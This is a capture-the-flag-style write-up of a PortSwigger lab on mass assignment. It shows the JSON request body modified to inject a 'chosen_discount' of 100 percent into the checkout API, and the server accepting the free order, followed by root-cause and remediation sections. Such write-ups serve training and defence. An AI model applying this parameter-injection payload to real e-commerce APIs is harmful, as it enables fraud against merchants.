# PortSwigger Web Security Academy Write-up: Exploiting a Mass Assignment Vulnerability

## Overview
- **Lab Name:** Exploiting a mass assignment vulnerability
- **Category:** API Security / Mass Assignment & Logic Flaws
- **Difficulty:** Practitioner
- **Target:** PortSwigger Web Security Academy Lab Environment

---

## Executive Summary
Mass assignment occurs when software frameworks automatically bind request parameters to internal database object fields without proper filtering. In this lab, analyzing API endpoints revealed that GET requests to `/api/checkout` returned unseen hidden properties in the response payload (`chosen_discount`). By injecting this missing field (`"chosen_discount": { "percentage": 100 }`) directly into the POST checkout request body, we exploited the mass assignment flaw to apply a 100% discount and successfully purchase the **Lightweight "l33t" Leather Jacket** for free.

---

## Walkthrough & Proof of Concept (PoC)

### Step 1: Authentication & Target Inspection
1. Logged into the target application using standard credentials (`wiener:peter`).
2. Added the target item (**Lightweight "l33t" Leather Jacket** / Product ID `1`) to the shopping cart.
3. Attempted to place an order, resulting in an `INSUFFICIENT_FUNDS` error due to zero store credit (`$0.00`).
 ![IMAGE](IMAGES-3/3.png)
### Step 2: Traffic Analysis & Field Discovery
1. Examined proxy HTTP history in **Burp Suite**.
2. Inspected the `GET /api/checkout` API response:
   ```json
   {
     "chosen_discount": {
       "percentage": 0
     },
     "chosen_products": [
       {
         "product_id": "5",
         "name": "Com-Tool",
         "quantity": 1,
         "item_price": 7069
       }
     ]
   }
   ```
3. **Key Finding:** The server returns a `chosen_discount` JSON object in the GET response, even though the frontend checkout interface only submits `chosen_products` during a POST request.

### Step 3: Parameter Injection / Mass Assignment Exploitation
1. Sent the `POST /api/checkout` request to **Burp Repeater**.
2. Standard request body sent by the web application:
   ```json
   {
     "chosen_products": [
       {
         "product_id": "1",
         "quantity": 1
       }
     ]
   }
   ```
3. Modified the JSON request body to inject the discovered `chosen_discount` parameter with a 100% discount rate:
   ```json
   {
     "chosen_discount": {
       "percentage": 100
     },
     "chosen_products": [
       {
         "product_id": "1",
         "quantity": 1
       }
     ]
   }
   ```

### Step 4: Verification & Order Confirmation
1. Dispatched the modified `POST /api/checkout` request.
2. Server responded with **`HTTP/2 201 Created`**:
   ```http
   HTTP/2 201 Created
   Location: /cart/order-confirmation?order-confirmed=true
   Content-Length: 0
   ```
3. The checkout succeeded without requiring any store credit, successfully solving the lab.

---

## Root Cause Analysis
- **Automatic Data Binding:** The backend ORM/API framework automatically mapped client-supplied JSON parameters into the underlying order data model without field filtering (allowlisting).
- **Over-Exposed Data:** API endpoints exposed internal fields (`chosen_discount`) in `GET` responses that users were not intended to directly modify during client-to-server operations.

---

## Remediation Guidelines
1. **Implement Strict Allowlisting (DTO Mapping):** Explicitly bind incoming request data only to dedicated Data Transfer Objects (DTOs) or allowable schema fields, ignoring unrecognized or sensitive parameters.
2. **Immutable System State:** Do not allow administrative or business-logic properties (such as discount percentages, user roles, or pricing) to be overwritten directly from unauthenticated or standard user input streams.
